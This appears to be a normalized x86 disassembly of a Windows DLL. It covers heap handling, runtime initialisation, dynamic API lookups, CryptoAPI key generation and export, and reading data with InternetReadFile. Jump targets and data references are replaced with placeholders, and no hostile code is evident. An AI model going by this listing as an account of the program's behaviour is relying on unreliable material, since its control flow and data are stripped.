mov ecx [ ebp + 0x14 ]
imul ecx [ ebp - 0x8 ]
mov eax [ ebp + 0xc ]
mov eax [ eax ]
sub eax ecx
cmp eax [ ebp - 0x8 ]
ja r-xdata
sub_1005f830
push ebp
mov ebp esp
mov ecx [ rw-data ]
mov edx [ ecx + 0x20 ]
sub edx [ ecx + 0x1c ]
mov eax 0x38e38e39
imul edx
sar edx 0x3
push esi
mov eax edx
shr eax 0x1f
push edi
mov edi [ ecx + 0x1c ]
mov ecx [ ecx + 0x20 ]
lea esi [ edx + eax - 0x1 ]
sub ecx edi
mov eax 0x38e38e39
imul ecx
sar edx 0x3
mov ecx edx
shr ecx 0x1f
add ecx edx
cmp ecx esi
ja r-xdata
lea edx [ esi + esi * 8 ]
mov eax [ edi + edx * 4 + 0x1c ]
lea esi [ edi + edx * 4 + 0x1c ]
mov edi [ ebp + 0x10 ]
test eax eax
jne r-xdata
push r--data
call sub_1003b4a6
mov ecx [ esi + 0x4 ]
add ecx edi
push ecx
push eax
push 0x8
call [ GetProcessHeap@IAT ]
push eax
call [ HeapReAlloc@IAT ]
push edi
push 0x8
call [ GetProcessHeap@IAT ]
push eax
call [ HeapAlloc@IAT ]
jmp r-xdata
mov edx [ ebp + 0xc ]
mov [ esi ] eax
mov eax [ esi + 0x4 ]
add eax [ esi ]
push edi
push edx
push eax
call sub_10078600
add esp 0xc
add [ esi + 0x4 ] edi
mov eax edi
pop edi
pop esi
pop ebp
retn
sub_1005f8e0
push ebp
mov ebp esp
push 0xffffffff
push sub_1007fe20
mov eax [ fs : 0x0 ]
push eax
push ecx
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov [ ebp - 0x10 ] esp
mov esi [ ebp + 0x8 ]
mov eax [ ebp + 0x10 ]
sub eax [ ebp + 0xc ]
mov edi [ esi + 0x10 ]
cmp edi eax
ja r-xdata
mov [ ebp - 0x4 ] 0x0
mov eax [ ebp + 0xc ]
jmp r-xdata
cmp [ esi + 0x14 ] eax
je r-xdata
cmp eax [ ebp + 0x10 ]
je r-xdata
push 0x1
push eax
mov ecx esi
call sub_10050a00
test al al
je r-xdata
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x10
movsx dx [ eax ]
movzx eax dx
push eax
push 0x1
mov ecx esi
call sub_10039dd0
mov eax [ ebp + 0xc ]
inc eax
mov [ ebp + 0xc ] eax
jmp r-xdata
cmp [ esi + 0x14 ] 0x8
mov [ esi + 0x10 ] edi
jb r-xdata
mov eax esi
mov eax [ esi ]
jmp r-xdata
xor ecx ecx
mov [ eax + edi * 2 ] cx
sub_1005f96f
mov esi [ ebp + 0x8 ]
cmp [ esi + 0x14 ] 0x8
jb r-xdata
xor edx edx
push edx
mov [ esi + 0x14 ] 0x7
mov [ esi + 0x10 ] 0x0
push edx
mov [ esi ] dx
call sub_1002050e
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x10
mov ecx [ esi ]
push ecx
call sub_10065045
add esp 0x4
sub_1005f9e0
mov eax [ esi + 0x2c0 ]
mov [ esi ] r--data
test eax eax
je r-xdata
cmp [ esi + 0x2d8 ] 0x8
jb r-xdata
push eax
call [ FreeLibrary@IAT ]
mov [ esi + 0x2c0 ] 0x0
xor ecx ecx
mov [ esi + 0x2d8 ] 0x7
mov [ esi + 0x2d4 ] 0x0
mov [ esi + 0x2c4 ] cx
mov ecx esi
jmp sub_1005d8e0
mov eax [ esi + 0x2c4 ]
push eax
call sub_10065045
add esp 0x4
sub_1005fa40
push ebp
mov ebp esp
push 0xffffffff
push sub_1007dd30
mov eax [ fs : 0x0 ]
push eax
push ecx
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov [ ebp - 0x10 ] esp
mov esi ecx
push 0x10
mov [ ebp - 0x4 ] 0x0
call sub_1005ac7e
add esp 0x4
test eax eax
je r-xdata
xor eax eax
mov ecx 0x1
mov [ eax + 0x4 ] ecx
mov [ eax + 0x8 ] ecx
mov ecx [ ebp + 0x8 ]
mov [ eax ] r--data
mov [ eax + 0xc ] ecx
jmp r-xdata
mov edx [ ebp + 0x8 ]
push eax
push edx
mov ecx esi
call sub_100393c0
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_1005fadc
push 0x28
mov eax sub_1007e4e0
call sub_10050d0f
mov ebx [ ebp + 0x8 ]
and [ ebp - 0x10 ] 0x0
test ebx ebx
je r-xdata
push 0x2
pop eax
call sub_1001a1b3
retn
cmp [ ebx ] 0x0
jne r-xdata
push 0x8
call sub_1005ac7e
mov esi eax
pop ecx
mov [ ebp + 0x8 ] esi
and [ ebp - 0x4 ] 0x0
test esi esi
je r-xdata
xor esi esi
mov eax [ ebp + 0xc ]
mov eax [ eax ]
mov ecx [ eax + 0x18 ]
test ecx ecx
je r-xdata
lea ecx [ ebp - 0x34 ]
call sub_10062210
add eax 0x1c
mov eax ecx
jmp r-xdata
or [ ebp - 0x4 ] 0xffffffff
test [ ebp - 0x10 ] 0x1
mov [ ebx ] esi
je r-xdata
push eax
lea ecx [ ebp - 0x34 ]
call sub_100216c0
and [ esi + 0x4 ] 0x0
mov [ ebp - 0x10 ] 0x1
mov [ esi ] r--data
jmp r-xdata
sub_1005fb60
push ebp
mov ebp esp
mov edx [ ebp + 0x8 ]
push esi
mov esi ecx
mov ecx [ ebp + 0xc ]
push ecx
xor eax eax
mov [ esi + 0x14 ] 0x7
mov [ esi + 0x10 ] 0x0
push edx
mov ecx esi
mov [ esi ] ax
call sub_1005e3c0
mov eax esi
pop esi
pop ebp
retn 0x8
sub_1005fb8f
push ebp
mov ebp esp
push ecx
push ecx
push edi
xor edi edi
push edi
push 0x1
push edi
push edi
lea eax [ ebp - 0x8 ]
push eax
mov [ ebp - 0x8 ] edi
mov [ ebp - 0x4 ] edi
call [ CryptAcquireContextW@IAT ]
test eax eax
jne r-xdata
push ebx
push esi
lea eax [ ebp - 0x4 ]
push eax
mov eax [ ebp + 0x18 ]
or eax 0x80
shl eax 0x10
push eax
push 0xa400
push [ ebp - 0x8 ]
call [ CryptGenKey@IAT ]
test eax eax
jne r-xdata
inc eax
mov ebx [ ebp + 0xc ]
mov esi [ CryptExportKey@IAT ]
push ebx
push edi
push edi
push 0x6
push edi
push [ ebp - 0x4 ]
call esi
test eax eax
jne r-xdata
push 0x2
push [ ebx ]
mov ebx [ GetProcessHeap@IAT ]
push 0x8
call ebx
push eax
call [ HeapAlloc@IAT ]
mov ecx [ ebp + 0x8 ]
mov [ ecx ] eax
cmp eax edi
jne r-xdata
push [ ebp - 0x4 ]
call [ CryptDestroyKey@IAT ]
push 0x3
jmp r-xdata
pop edi
leave
retn 0x14
push [ ebp + 0xc ]
push eax
push edi
push 0x6
push edi
push [ ebp - 0x4 ]
call esi
test eax eax
jne r-xdata
push [ ebp - 0x4 ]
call [ CryptDestroyKey@IAT ]
push 0x4
jmp r-xdata
pop esi
push [ ebp + 0x14 ]
push edi
push edi
push 0x7
push edi
push [ ebp - 0x4 ]
call esi
test eax eax
jne r-xdata
push [ ebp - 0x4 ]
call [ CryptDestroyKey@IAT ]
push 0x5
jmp r-xdata
mov eax [ ebp + 0x14 ]
push [ eax ]
push 0x8
call ebx
push eax
call [ HeapAlloc@IAT ]
mov ecx [ ebp + 0x10 ]
mov [ ecx ] eax
cmp eax edi
jne r-xdata
push [ ebp - 0x4 ]
call [ CryptDestroyKey@IAT ]
push 0x6
jmp r-xdata
push [ ebp + 0x14 ]
push eax
push edi
push 0x6
push edi
push [ ebp - 0x4 ]
call esi
push [ ebp - 0x4 ]
test eax eax
jne r-xdata
push [ ebp - 0x4 ]
call [ CryptDestroyKey@IAT ]
push 0x7
jmp r-xdata
call [ CryptDestroyKey@IAT ]
xor esi esi
jmp r-xdata
call [ CryptDestroyKey@IAT ]
push 0x8
jmp r-xdata
push edi
push [ ebp - 0x8 ]
call [ CryptReleaseContext@IAT ]
mov eax esi
pop esi
pop ebx
jmp r-xdata
sub_1005fce0
push ebp
mov ebp esp
mov eax [ ebp + 0xc ]
cmp [ eax + 0x8 ] 0x0
jbe r-xdata
pop ebp
retn
mov eax [ eax ]
mov ecx [ ebp + 0x8 ]
push eax
push ecx
call sub_10030ff0
add esp 0x8
sub_1005fd20
push ebp
mov ebp esp
sub esp 0x26c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
push esi
push edi
push 0x208
lea eax [ ebp - 0x258 ]
mov ebx ecx
push 0x0
push eax
mov [ ebp - 0x268 ] ebx
call sub_10078970
add esp 0xc
lea ecx [ ebp - 0x258 ]
call sub_10044b20
test eax eax
je r-xdata
mov esi [ ebx ]
lea edi [ ebp - 0x25c ]
call sub_1001e330
test eax eax
je r-xdata
lea edx [ ebp - 0x50 ]
mov eax 0x72
call sub_1001bb80
mov eax 0x1
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_1004c3b6
mov esp ebp
pop ebp
retn
mov ebx [ ebx ]
xor eax eax
lea ecx [ ebp - 0x260 ]
push ecx
lea ecx [ ebp - 0x264 ]
mov [ ebp - 0x25c ] eax
mov [ ebp - 0x260 ] eax
mov [ ebp - 0x264 ] eax
call sub_10021b00
test eax eax
je r-xdata
lea edx [ ebp - 0x4c ]
mov eax 0x74
call sub_1001bb80
mov eax 0x2
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_1004c3b6
mov esp ebp
pop ebp
retn
lea edi [ ebp - 0x264 ]
lea ecx [ ebp - 0x260 ]
call sub_1002d790
test eax eax
je r-xdata
lea edx [ ebp - 0x50 ]
mov eax 0x1a
call sub_1001bb80
mov [ ebp - 0x25c ] 0x3
mov edx [ ebp - 0x264 ]
mov eax [ ebp - 0x260 ]
push edx
push eax
lea eax [ ebp - 0x258 ]
call sub_1000c170
add esp 0x8
test eax eax
je r-xdata
lea edx [ ebp - 0x50 ]
mov eax 0x12f
call sub_1001bb80
mov [ ebp - 0x25c ] 0x4
jmp r-xdata
mov esi [ ebp - 0x25c ]
lea edx [ ebp - 0x50 ]
mov eax 0xaa
call sub_1001bb80
mov esi 0x6
jmp r-xdata
mov ecx [ ebp - 0x268 ]
mov esi [ ecx ]
call sub_1000d0b0
test eax eax
je r-xdata
lea edx [ ebp - 0x50 ]
mov eax 0xaa
call sub_1001bb80
mov eax 0x5
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_1004c3b6
mov esp ebp
pop ebp
retn
mov ecx [ ebp - 0x4 ]
pop edi
mov eax esi
pop esi
xor ecx ebp
pop ebx
call sub_1004c3b6
mov esp ebp
pop ebp
retn
push eax
push 0x0
call [ GetProcessHeap@IAT ]
push eax
call [ HeapFree@IAT ]
mov eax [ ebp - 0x260 ]
test eax eax
je r-xdata
sub_1005feca
mov edi edi
push esi
push 0x4
push 0x20
call sub_10025450
pop ecx
pop ecx
mov esi eax
push esi
call [ EncodePointer@IAT ]
mov [ rw-data ] eax
mov [ rw-data ] eax
test esi esi
jne r-xdata
and [ esi ] 0x0
xor eax eax
pop esi
retn
push 0x18
pop eax
pop esi
retn
sub_1005ff30
push ebp
mov ebp esp
push 0xffffffff
push sub_10080a06
mov eax [ fs : 0x0 ]
push eax
push ecx
push esi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
xor esi esi
mov [ ebp - 0x10 ] rw-data
mov [ rw-data ] r--data
mov [ rw-data ] esi
mov [ rw-data ] esi
mov [ rw-data ] esi
mov [ ebp - 0x4 ] esi
mov [ rw-data ] esi
mov [ rw-data ] esi
mov [ rw-data ] esi
mov [ rw-data ] esi
mov [ ebp - 0x4 ] 0x1
push esi
xor eax eax
push r--data
mov ecx rw-data
mov [ rw-data ] esi
mov [ rw-data ] esi
mov [ rw-data ] 0x7
mov [ rw-data ] esi
mov [ rw-data ] ax
call sub_1005e3c0
push rw-data
mov [ rw-data ] esi
mov [ rw-data ] esi
mov [ rw-data ] esi
call [ InitializeCriticalSection@IAT ]
mov eax rw-data
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop esi
mov esp ebp
pop ebp
retn
sub_10060008
mov edi edi
push ebp
mov ebp esp
sub esp 0x24
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
push ebx
mov [ ebp - 0x20 ] eax
mov eax [ ebp + 0xc ]
push esi
push edi
mov [ ebp - 0x1c ] eax
call sub_10042f06
and [ ebp - 0x14 ] 0x0
cmp [ rw-data ] 0x0
mov [ ebp - 0x18 ] eax
jne r-xdata
mov eax [ rw-data ]
mov ecx [ ebp - 0x18 ]
mov esi [ DecodePointer@IAT ]
cmp eax ecx
je r-xdata
push r--data
call [ LoadLibraryW@IAT ]
mov ebx eax
test ebx ebx
je r-xdata
mov eax [ rw-data ]
cmp eax [ ebp - 0x18 ]
je r-xdata
cmp [ rw-data ] ecx
je r-xdata
xor eax eax
mov edi [ GetProcAddress@IAT ]
push r--data
push ebx
call edi
test eax eax
je r-xdata
push [ rw-data ]
call esi
test eax eax
je r-xdata
push eax
call esi
test eax eax
je r-xdata
push eax
call esi
push [ rw-data ]
mov edi eax
call esi
mov ebx eax
test edi edi
je r-xdata
mov esi [ EncodePointer@IAT ]
push eax
call esi
push r--data
push ebx
mov [ rw-data ] eax
call edi
push eax
call esi
push r--data
push ebx
mov [ rw-data ] eax
call edi
push eax
call esi
push r--data
push ebx
mov [ rw-data ] eax
call edi
push eax
call esi
mov [ rw-data ] eax
test eax eax
je r-xdata
push [ ebp + 0x10 ]
push [ ebp - 0x1c ]
push [ ebp - 0x20 ]
push [ ebp - 0x14 ]
call eax
jmp r-xdata
call eax
mov [ ebp - 0x14 ] eax
test eax eax
je r-xdata
test ebx ebx
je r-xdata
push r--data
push ebx
call edi
push eax
call esi
mov [ rw-data ] eax
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_1004c3b6
leave
retn
mov eax [ rw-data ]
cmp eax [ ebp - 0x18 ]
je r-xdata
call edi
test eax eax
je r-xdata
push eax
call esi
test eax eax
je r-xdata
or [ ebp + 0x10 ] 0x200000
jmp r-xdata
lea ecx [ ebp - 0x24 ]
push ecx
push 0xc
lea ecx [ ebp - 0x10 ]
push ecx
push 0x1
push eax
call ebx
test eax eax
je r-xdata
push [ ebp - 0x14 ]
call eax
mov [ ebp - 0x14 ] eax
test [ ebp - 0x8 ] 0x1
jne r-xdata
sub_10060174
mov edi edi
push ebp
mov ebp esp
push 0x0
push 0x0
call sub_10011a54
pop ecx
pop ecx
test eax eax
jne r-xdata
push esi
mov esi [ ebp + 0x8 ]
push eax
lea ecx [ esi + 0x14 ]
call sub_1005daf0
cmp [ ebp + 0xc ] 0x0
je r-xdata
mov eax r--data
mov eax r--data
push [ ebp + 0xc ]
push 0x0
call sub_10011a54
pop ecx
pop ecx
test eax eax
jne r-xdata
push eax
lea ecx [ esi + 0x1c ]
call sub_1005daf0
pop esi
pop ebp
retn
sub_100601c1
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
xor eax eax
jmp r-xdata
cmp esi [ ebp + 0xc ]
jb r-xdata
test eax eax
jne r-xdata
pop esi
pop ebp
retn
mov ecx [ esi ]
test ecx ecx
je r-xdata
add esi 0x4
call ecx
sub_100601f0
push ebp
mov ebp esp
push 0xffffffff
push sub_1007ffdc
mov eax [ fs : 0x0 ]
push eax
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov esi [ ebp + 0x8 ]
mov ebx 0x7
xor edi edi
xor eax eax
mov [ esi + 0x14 ] ebx
mov [ esi + 0x10 ] edi
mov [ esi ] ax
mov [ ebp - 0x4 ] edi
mov [ esi + 0x1c ] edi
mov [ esi + 0x20 ] edi
xor ecx ecx
mov [ esi + 0x38 ] ebx
mov [ esi + 0x34 ] edi
mov [ esi + 0x24 ] cx
xor edx edx
mov [ esi + 0x54 ] ebx
mov [ esi + 0x50 ] edi
mov [ esi + 0x40 ] dx
mov [ esi + 0x70 ] ebx
mov [ esi + 0x6c ] edi
mov [ esi + 0x5c ] ax
mov [ esi + 0x8c ] ebx
mov [ esi + 0x88 ] edi
mov [ esi + 0x78 ] cx
mov [ esi + 0xa8 ] ebx
mov [ esi + 0xa4 ] edi
mov [ esi + 0x94 ] dx
mov [ esi + 0xc4 ] ebx
mov [ esi + 0xc0 ] edi
mov [ esi + 0xb0 ] ax
mov [ esi + 0xe0 ] ebx
mov [ esi + 0xdc ] edi
mov [ esi + 0xcc ] cx
lea ecx [ esi + 0xe8 ]
mov [ ebp - 0x4 ] bl
push 0x1
mov [ ecx + 0x14 ] ebx
mov [ ecx + 0x10 ] edi
push r--data
mov [ ecx ] dx
call sub_1005e3c0
lea ecx [ esi + 0x104 ]
mov [ ebp - 0x4 ] 0x8
push 0x1
xor eax eax
mov [ ecx + 0x14 ] ebx
mov [ ecx + 0x10 ] edi
push r--data
mov [ ecx ] ax
call sub_1005e3c0
mov [ esi + 0x120 ] edi
mov [ esi + 0x124 ] edi
mov [ esi + 0x128 ] edi
mov [ esi + 0x12c ] edi
mov [ esi + 0x130 ] edi
mov [ esi + 0x134 ] edi
mov [ esi + 0x138 ] edi
push edi
mov [ esi + 0x13c ] edi
push edi
mov [ esi + 0x140 ] edi
call [ CoInitializeEx@IAT ]
mov eax esi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_1006034e
push 0x28
mov eax sub_1007e5a2
call sub_10050d0f
and [ ebp - 0x10 ] 0x0
mov ebx [ ebp + 0x8 ]
test ebx ebx
je r-xdata
push 0x3
pop eax
call sub_1001a1b3
retn
cmp [ ebx ] 0x0
jne r-xdata
push 0x34
call sub_1005ac7e
mov esi eax
pop ecx
mov [ ebp + 0x8 ] esi
and [ ebp - 0x4 ] 0x0
test esi esi
je r-xdata
xor esi esi
mov eax [ ebp + 0xc ]
mov eax [ eax ]
mov ecx [ eax + 0x18 ]
test ecx ecx
je r-xdata
lea ecx [ ebp - 0x34 ]
call sub_10062210
add eax 0x1c
mov eax ecx
jmp r-xdata
or [ ebp - 0x4 ] 0xffffffff
test [ ebp - 0x10 ] 0x1
mov [ ebx ] esi
je r-xdata
push eax
lea ecx [ ebp - 0x34 ]
call sub_100216c0
and [ esi + 0x4 ] 0x0
xor ecx ecx
inc ecx
mov [ ebp - 0x10 ] ecx
push ecx
mov [ esi + 0x28 ] cl
push eax
mov ecx esi
mov [ ebp - 0x4 ] 0x2
mov [ esi ] r--data
call sub_100123d5
mov [ esi ] r--data
jmp r-xdata
sub_100603f0
push ebp
mov ebp esp
sub esp 0x8
mov eax [ ebp + 0xc ]
push ebx
push esi
push edi
push 0x0
push 0x0
lea edx [ ebp - 0x4 ]
mov [ eax ] 0x0
mov eax [ ecx ]
push edx
push eax
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] 0x0
call [ InternetQueryDataAvailable@IAT ]
test eax eax
je r-xdata
pop edi
pop esi
mov eax 0x1
pop ebx
mov esp ebp
pop ebp
retn 0x8
mov ebx [ ebp + 0x8 ]
jmp r-xdata
cmp [ ebp - 0x4 ] 0x0
je r-xdata
pop edi
pop esi
xor eax eax
pop ebx
mov esp ebp
pop ebp
retn 0x8
mov ecx [ ebp + 0xc ]
mov edi [ ecx ]
push 0x401
push 0x0
mov [ ebp + 0x8 ] 0x0
call [ GetProcessHeap@IAT ]
push eax
call [ HeapAlloc@IAT ]
lea edx [ ebp + 0x8 ]
push edx
mov esi eax
mov eax [ ebp - 0x8 ]
mov ecx [ eax ]
push 0x400
push esi
push ecx
call [ InternetReadFile@IAT ]
mov edx [ ebp + 0x8 ]
mov [ esi + edx ] 0x0
mov eax [ ebp + 0x8 ]
test edi edi
je r-xdata
inc eax
push eax
push 0x0
call [ GetProcessHeap@IAT ]
push eax
call [ HeapAlloc@IAT ]
mov edx [ ebx ]
lea ecx [ eax + edi + 0x1 ]
push ecx
push edx
push 0x0
call [ GetProcessHeap@IAT ]
push eax
call [ HeapReAlloc@IAT ]
jmp r-xdata
mov ecx [ ebp + 0x8 ]
inc ecx
push ecx
mov edx eax
add edx edi
push 0x0
push edx
mov [ ebx ] eax
call sub_10078970
mov eax [ ebp + 0x8 ]
mov ecx [ ebx ]
push eax
add ecx edi
push esi
push ecx
call sub_10078600
add esp 0x18
push esi
push 0x0
call [ GetProcessHeap@IAT ]
push eax
call [ HeapFree@IAT ]
mov edx [ ebp + 0x8 ]
mov eax [ ebp + 0xc ]
add [ eax ] edx
mov ecx [ ebp - 0x8 ]
mov edx [ ecx ]
push 0x0
push 0x0
lea eax [ ebp - 0x4 ]
push eax
push edx
call [ InternetQueryDataAvailable@IAT ]
test eax eax
jne r-xdata
sub_10060520
push ebp
mov ebp esp
sub esp 0xc
push ebx
mov ebx [ ebp + 0x8 ]
push esi
push edi
mov edi [ ebp + 0xc ]
mov eax edi
sub eax ebx
sar eax 0x2
cmp eax 0x20
jle r-xdata
cmp eax 0x1
jle r-xdata
mov esi [ ebp + 0x10 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
cmp ebx edi
je r-xdata
cmp eax 0x20
jle r-xdata
mov eax [ ebp + 0x14 ]
push eax
push edi
lea ecx [ ebp - 0x8 ]
push ebx
push ecx
call sub_1000be80
mov ecx [ ebp - 0x8 ]
mov eax esi
cdq
sub eax edx
sar eax 0x1
mov esi eax
cdq
sub eax edx
sar eax 0x1
add esi eax
mov eax [ ebp - 0x4 ]
mov edx edi
sub edx eax
sub ecx ebx
add esp 0x10
and edx 0xfffffffc
and ecx 0xfffffffc
cmp ecx edx
mov edx [ ebp + 0x14 ]
push edx
push esi
jge r-xdata
mov edx [ ebp + 0x14 ]
push edx
push edi
push ebx
call sub_10057170
add esp 0xc
mov eax edi
sub eax ebx
and eax 0xfffffffc
cmp eax 0x4
jle r-xdata
push edi
push eax
call sub_10060520
mov edi [ ebp - 0x8 ]
mov eax [ ebp - 0x8 ]
push eax
push ebx
call sub_10060520
mov ecx [ ebp - 0x4 ]
mov [ ebp + 0x8 ] ecx
mov ebx ecx
jmp r-xdata
mov ebx [ ebp + 0x14 ]
mov ecx [ ebp + 0x8 ]
mov eax edi
call sub_10051030
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov ecx [ ebp + 0x14 ]
push ecx
mov ecx edi
mov eax ebx
call sub_10011f80
add esp 0x4
test esi esi
jle r-xdata
mov eax edi
sub eax ebx
sar eax 0x2
add esp 0x10
cmp eax 0x20
jg r-xdata
sub_10060603
mov edi edi
push edi
push r--data
call [ GetModuleHandleW@IAT ]
mov edi eax
test edi edi
jne r-xdata
push esi
mov esi [ GetProcAddress@IAT ]
push r--data
push edi
call esi
push r--data
push edi
mov [ rw-data ] eax
call esi
push r--data
push edi
mov [ rw-data ] eax
call esi
push r--data
push edi
mov [ rw-data ] eax
call esi
cmp [ rw-data ] 0x0
mov esi [ TlsSetValue@IAT ]
mov [ rw-data ] eax
je r-xdata
call sub_1000e9b8
xor eax eax
pop edi
retn
mov eax [ TlsGetValue@IAT ]
mov [ rw-data ] eax
mov eax [ TlsFree@IAT ]
mov [ rw-data ] sub_10031ffa
mov [ rw-data ] esi
mov [ rw-data ] eax
cmp [ rw-data ] 0x0
je r-xdata
xor eax eax
push [ rw-data ]
push eax
call esi
test eax eax
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
call sub_10046825
push [ rw-data ]
mov esi [ EncodePointer@IAT ]
call esi
push [ rw-data ]
mov [ rw-data ] eax
call esi
push [ rw-data ]
mov [ rw-data ] eax
call esi
push [ rw-data ]
mov [ rw-data ] eax
call esi
mov [ rw-data ] eax
call sub_1003a210
test eax eax
je r-xdata
test eax eax
jne r-xdata
call sub_1000e9b8
mov edi [ DecodePointer@IAT ]
push sub_10023671
push [ rw-data ]
call edi
call eax
mov [ rw-data ] eax
cmp eax 0xffffffff
je r-xdata
call [ TlsAlloc@IAT ]
mov [ rw-data ] eax
cmp eax 0xffffffff
je r-xdata
push 0x214
push 0x1
call sub_10025450
mov esi eax
pop ecx
pop ecx
test esi esi
je r-xdata
push esi
push [ rw-data ]
push [ rw-data ]
call edi
call eax
test eax eax
je r-xdata
push 0x0
push esi
call sub_1000a5ee
pop ecx
pop ecx
call [ GetCurrentThreadId@IAT ]
or [ esi + 0x4 ] 0xffffffff
mov [ esi ] eax
xor eax eax
inc eax
jmp r-xdata
pop esi
pop edi
retn
sub_10060780
push ebp
mov ebp esp
push esi
mov esi ecx
mov eax [ esi + 0x1c ]
mov [ esi ] r--data
test eax eax
je r-xdata
mov eax [ esi + 0xc ]
test eax eax
je r-xdata
push eax
push 0x0
call [ GetProcessHeap@IAT ]
push eax
call [ HeapFree@IAT ]
test [ ebp + 0x8 ] 0x1
mov [ esi + 0xc ] 0x0
mov [ esi + 0x10 ] 0x0
mov [ esi + 0x14 ] 0x0
je r-xdata
push eax
call sub_10065045
add esp 0x4
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call sub_10065045
add esp 0x4
sub_100607e0
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov edx [ ebp + 0x10 ]
push esi
mov esi [ ebp + 0xc ]
mov ecx esi
sub ecx eax
push ecx
push eax
push edx
call sub_10078600
add esp 0xc
mov eax esi
pop esi
pop ebp
retn 0xc
sub_10060803
push 0x38
mov eax sub_1007e7ff
call sub_10007703
mov eax [ ebp + 0x8 ]
mov esi [ ebp + 0x1c ]
mov edi [ ebp + 0x20 ]
mov ebx [ ebp + 0x24 ]
and [ ebp - 0x38 ] 0x0
mov [ ebp - 0x40 ] eax
lea eax [ ebp - 0x3c ]
mov [ ebp - 0x34 ] ecx
push eax
mov ecx esi
call sub_10009450
mov esi [ esi + 0x14 ]
and [ ebp - 0x4 ] 0x0
push eax
push esi
lea eax [ ebp + 0x14 ]
push eax
lea eax [ ebp + 0xc ]
push eax
lea eax [ ebp - 0x30 ]
push eax
push [ ebp - 0x34 ]
call sub_10010e0d
or [ ebp - 0x4 ] 0xffffffff
add esp 0x18
lea ecx [ ebp - 0x3c ]
mov esi eax
call sub_1002a730
cmp [ ebp - 0x30 ] 0x2d
lea eax [ ebp - 0x2f ]
je r-xdata
mov [ ebp - 0x34 ] eax
lea eax [ ebp - 0x38 ]
push eax
push esi
lea eax [ ebp - 0x44 ]
push eax
push [ ebp - 0x34 ]
call sub_10045daa
mov esi eax
add esp 0x10
lea eax [ ebp + 0x14 ]
push eax
lea ecx [ ebp + 0xc ]
call sub_10060ea7
test al al
je r-xdata
lea eax [ ebp - 0x30 ]
mov eax [ ebp - 0x34 ]
cmp [ ebp - 0x44 ] eax
je r-xdata
or [ edi ] 0x1
or [ edi ] 0x2
cmp [ ebp - 0x38 ] 0x0
jne r-xdata
cmp esi 0xffff
ja r-xdata
cmp [ ebp - 0x30 ] 0x2d
jne r-xdata
mov [ ebx ] si
jmp r-xdata
neg esi
mov ecx [ ebp + 0xc ]
mov eax [ ebp - 0x40 ]
mov [ eax ] ecx
mov ecx [ ebp + 0x10 ]
mov [ eax + 0x4 ] ecx
call sub_10019c00
retn 0x20
sub_100608e0
push esi
mov esi eax
mov eax [ edi + 0x4 ]
cmp esi eax
jae r-xdata
cmp eax [ edi + 0x8 ]
jne r-xdata
mov ecx [ edi ]
cmp ecx esi
ja r-xdata
mov eax [ edi + 0x4 ]
test eax eax
je r-xdata
mov ecx edi
call sub_10016580
sub esi ecx
sar esi 0x3
cmp eax [ edi + 0x8 ]
jne r-xdata
add [ edi + 0x4 ] 0x8
pop esi
retn
mov ecx [ esi ]
mov [ eax ] ecx
mov edx [ esi + 0x4 ]
mov [ eax + 0x4 ] edx
mov ecx [ edi + 0x4 ]
test ecx ecx
je r-xdata
mov ecx edi
call sub_10016580
mov eax [ edi ]
mov edx [ eax + esi * 8 ]
mov [ ecx ] edx
mov eax [ eax + esi * 8 + 0x4 ]
mov [ ecx + 0x4 ] eax
add [ edi + 0x4 ] 0x8
pop esi
retn
sub_10060940
push ebp
mov ebp esp
push 0xffffffff
push sub_10081190
mov eax [ fs : 0x0 ]
push eax
sub esp 0x5c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x10 ] eax
push esi
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
push 0x144
push 0x0
mov esi ecx
call [ GetProcessHeap@IAT ]
push eax
call [ HeapAlloc@IAT ]
mov [ ebp - 0x64 ] eax
mov [ ebp - 0x4 ] 0x0
test eax eax
je r-xdata
xor eax eax
push eax
call sub_100601f0
jmp r-xdata
push esi
mov ecx ebx
call sub_100071d0
test eax eax
je r-xdata
mov [ ebp - 0x4 ] 0xffffffff
mov esi [ ebp - 0x64 ]
test esi esi
je r-xdata
mov [ ebp - 0x4 ] 0xffffffff
push eax
lea ecx [ ebp - 0x68 ]
mov [ ebp - 0x68 ] 0x0
mov [ ebp - 0x64 ] 0x0
call sub_10028710
mov [ ebp - 0x4 ] 0x1
mov edx [ ebp - 0x68 ]
test edx edx
jne r-xdata
